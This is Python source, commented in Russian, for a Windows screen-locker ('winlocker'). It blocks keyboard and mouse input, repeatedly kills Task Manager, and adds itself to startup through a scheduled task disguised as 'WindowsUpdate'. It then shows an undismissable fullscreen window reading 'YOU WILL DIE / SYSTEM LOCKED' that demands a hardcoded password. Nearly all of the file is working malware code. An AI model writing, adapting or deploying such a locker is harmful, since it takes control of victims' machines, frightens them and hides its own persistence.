import ctypes, os, sys, time, threading, random, webbrowser, tkinter as tk

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TIMER_SECONDS = 15  # для теста, потом 600
VIDEO_URL = "https://vk.com/video-30602036_456293338"

# === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# === БЛОКИРУЕМ WIN-КЛАВИШУ ===
def block_win_key():
    try:
        import keyboard
        keyboard.add_hotkey('windows', lambda: None, suppress=True)
        keyboard.add_hotkey('win', lambda: None, suppress=True)
    except:
        pass

# === УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ ===
def kill_taskmgr():
    while True:
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        time.sleep(0.1)

# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ (МЕТОД С ПЛАНИРОВЩИКОМ) ===
def add_to_startup():
    import subprocess
    script_path = os.path.abspath(__file__)
    command = f'python "{script_path}"'
    subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)

# === ОТКРЫВАЕМ ВИДЕО ВК В БРАУЗЕРЕ ===
def play_video():
    try:
        webbrowser.open(VIDEO_URL)
    except:
        pass

# === АНИМАЦИЯ ВЗЛОМА 0% → 100% ===
def show_boot_animation():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
    lbl.pack(expand=True)
    bar = tk.Canvas(root, width=600, height=30, bg='black', highlightthickness=0)
    bar.pack(pady=20)
    for i in range(0, 101, 5):
        lbl.config(text=f"ВЗЛОМ ctOS 2.0: {i}%")
        bar.delete("progress")
        bar.create_rectangle(10, 5, 10 + (i * 5.8), 25, fill='white', tags="progress")
        root.update()
        time.sleep(0.15)
    time.sleep(0.5)
    root.destroy()

# === ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Страшные надписи
        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='white', font=('Courier', 60, 'bold'), tags="title")
        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='white', font=('Courier', 36))
        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='white', font=('Courier', 28))
        
        # Поле ввода
        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='white', insertbackground='white')
        self.canvas.create_window(400, 360, window=self.entry)
        self.status = self.canvas.create_text(400, 420, text="", fill='white', font=('Courier', 20))
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        self.animate()
    
    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)
    
    def draw_reaper(self, x, y, frame):
        """Рисует ASCII Смерть с косой"""
        import math
        # Заменил двойные кавычки на одинарные, чтобы не было ошибки
        lines = [
            '     .-"-.\'',
            '    /|6 6|\\',
            '   {/(_0_)\\}',
            '    _/ ^ \\_',
            '   (/ /^\\ \\)-',
            '     ""\' \'""'
        ]
        angle = frame * 0.1
        end_x = x + int(40 * math.cos(angle))
        end_y = y + int(40 * math.sin(angle))
        self.canvas.create_line(x, y, end_x, end_y, fill='white', width=2)
        for i, line in enumerate(lines):
            self.canvas.create_text(x, y + i * 20, text=line, fill='white', font=('Courier', 16), tags="reaper")
    
    def animate(self):
        self.canvas.delete("reaper")
        import math
        self.draw_reaper(400, 500, int(time.time() * 10))
        
        if random.random() < 0.1:
            self.canvas.itemconfig("title", fill='gray')
        else:
            self.canvas.itemconfig("title", fill='white')
        self.win.after(50, self.animate)

# === ЗАПУСК ===
if __name__ == "__main__":
    # Если скрипт уже в автозагрузке, таймер не нужен
    if os.path.basename(sys.argv[0]) != "winlocker.py":
        TIMER_SECONDS = 0
    
    add_to_startup()
    threading.Thread(target=kill_taskmgr, daemon=True).start()
    time.sleep(TIMER_SECONDS)
    block_input(True)
    threading.Thread(target=block_win_key, daemon=True).start()
    threading.Thread(target=play_video, daemon=True).start()
    show_boot_animation()
    app = WinLocker()
    app.root.mainloop()
